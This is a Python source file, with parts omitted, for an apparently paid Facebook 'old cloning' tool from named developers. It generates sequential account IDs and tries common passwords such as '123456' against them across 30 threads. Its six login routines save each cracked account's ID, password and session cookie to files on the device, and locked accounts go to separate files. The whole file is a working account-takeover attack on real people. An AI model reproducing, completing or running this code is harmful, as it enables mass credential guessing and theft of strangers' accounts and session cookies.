...
for xd in range(10000):
    ...
    ugen.append(uaku)
#---------------------------| Colour |---------------------------#
white = '\x1b[1;97m';red = '\x1b[1;91m';green = '\x1b[38;5;48m';ping = '\x1b[38;5;205m';rr = random.randint;rc = random.choice
#---------------------------| Loop |---------------------------#
...
def loading():
    ...
    for i in range(50):
        time.sleep(0.14)
        sys.stdout.write(f'''\r {white}<|●|>{green} Loading...{white} ''' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()
#---------------------------| Linex |---------------------------#
...
#---------------------------| Logo |---------------------------#
logo=(f'''{white}        
 {white}<|●|> {white} db           .88b  d88. 
 {white}<|●|> {green} 88           88'YbdP`88 
 {white}<|●|> {white} 88           88  88  88 
 {white}<|●|> {green} 88           88  88  88 
 {white}<|●|> {white} 88booo.      88  88  88 
 {white}<|●|> {green} Y88888P      YP  YP  YP\n{white}───────────────────────────────────────────────\n <|●|> Devloper : Oussama / Mohamed\n <|●|> Tool Type: Old Cloning\n <|●|> Version: 1.0\n              {green}>>>{white}HExX Is Back{green}<<<\n{white}───────────────────────────────────────────────''')
#---------------------------| Menux |---------------------------#
def _____menux_____():
	clear()
	print(f"{white}<|1|> Old Cloning ");print(f"{white}<|2|> Contact With Developers ");linex();option=input(f"{white}<|?|> Choice >> ")
	if option in ["2"]:_____dev_____()
	if option in ["1"]:_____oldx_____()
	else:exit()
#---------------------------| devx |---------------------------#
def _____dev_____(): 
	clear()
	print(f"{white}<|●|> Choose Somone To Contact With:") 
	linex()
	print(f"{white}<|1|> Contact With HExX") 
	print(f"{white}<|2|> Contact With Oussama") 
	print(f"{white}<|3|> Contact With Mohamed") 
	linex()
	dev= input(f"{white}<|●|> choose:") 
	
	
	if dev in ['1','01']:
		os.system('xdg-open https://t.me/X_Z4xX');_____menux_____()
	elif dev in ['2','02']:
		os.system('xdg-open https://www.facebook.com/oussamaxyouvihh');_____menux_____()
		
	elif dev in ['3','03']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=61574890617831');_____menux_____()
...
def _____oldx_____():
	...
	for nmbr in range(int(limit)):
		...
		user.append(nmp)
	with tred(max_workers=30) as hexx:
		clear();tl = str(len(user))
		print(f"{white} Total Uid{white}<<{green}{tl}{white}>> ");linex()
		for love in user:
			uid=str("10000"+love);pas=['123456','1234567','12345678','123456789','123123','12341234']
			hexx.submit(____old____,uid,pas,tl)
...
def ____M1____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|LM-M1|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
		...
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|LM-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/LM-RANDM-M1-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|LM-CP|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M1-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
...
def ____M2____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|LM-M2|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|LM-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/LM-RANDM-M2-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|LM-CP|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M2-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M3____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|LM-M3|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|LM-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/LM-RANDM-M3-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|LM-CP|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M3-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M4____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|LM-M4|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|LM-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/LM-RANDM-M4-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|LM-CP|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M4-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M5____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|LM-M5|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|LM-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/LM-RANDM-M5-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|LM-CP|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M5-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
...
def ____M6____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|LM-M6|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|LM-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/LM-RANDM-M6-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|LM-CP|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M6-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|LM-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|LM-CP|> {uid} ● {ps}")
				open("/sdcard/LM-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			elif "session_key" in po:
				print(f"\r\r{green}<|LM-OK|> {uid} ● {ps}")
				open("/sdcard/LM-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			else:pass
		loop+=1
...
def approval():
  ...
  id = remove_symbols_and_spaces(uuid)+"-LM"
  ...
  try:
    httpCaht = get_response('https://github.com/MOHA-T-S/OLD-MOHA/blob/main/key%20lm.txt')
    if realid in httpCaht:
      loading() 
      clear() 
      print(f"{green} YOUR KEY APPROVED :\x1b[1;97m "+id)
      time.sleep(3)
      _____menux_____()
    else:
      loading() 
      clear() 
      print(f"{red} YOUR KEY NOT APPROVED :\x1b[1;97m "+id)
      linex()
      print(f'{green}\t     For Other Country User')
      linex()
      print(f'{white} 5$ For 15 Days')
      print(f'{white} 10$ For 01 Month')
      print(f'{white} Payment Method Bainance')
      linex()
      print(f'{green}\t     For Algeria Country User')
      linex()
      print(f'{white} 500 Da  For 15 Days')
      print(f'{white} 1000 Da For 01 Month')
      linex()
      print(f'{white} Get Approval For Premium Use')
      print(f'{white} Send Your Key To Admin')
      print(f'{white} And Get Approval')
      linex()
      input(f'{green} Press Enter')
      tks = ('Hello%20Abdou%20Sir%20!%20Please%20Approve%20My%20Kwy%20The%20Kwy%20Is%20:%20'+id);os.system('am start https://www.facebook.com/oussamaxyouvihh');approval() 
      sys.exit()
      time.sleep(1)
      approval()
